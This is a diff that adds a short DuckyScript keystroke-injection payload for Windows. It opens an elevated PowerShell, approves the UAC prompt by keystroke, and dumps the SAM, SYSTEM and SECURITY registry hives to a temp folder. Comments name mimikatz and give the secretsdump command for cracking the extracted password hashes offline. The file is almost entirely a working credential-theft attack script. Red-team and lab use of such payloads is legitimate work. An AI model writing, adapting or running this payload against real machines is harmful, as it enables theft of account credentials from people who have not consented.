@@ -1,0 +1,22 @@
+REM ============================================================
+REM  Windows · SAM + SYSTEM Registry Dump
+REM ============================================================
+REM  Saves the SAM and SYSTEM registry hives for offline
+REM  password hash extraction using secretsdump/mimikatz.
+REM
+REM  Requires admin. Output: C:\Windows\Temp\sam.hiv, system.hiv
+REM  Crack with: secretsdump.py -sam sam.hiv -system system.hiv LOCAL
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y
+STRINGLN reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y
+STRINGLN reg save HKLM\SECURITY C:\Windows\Temp\security.hiv /y
+STRINGLN exit
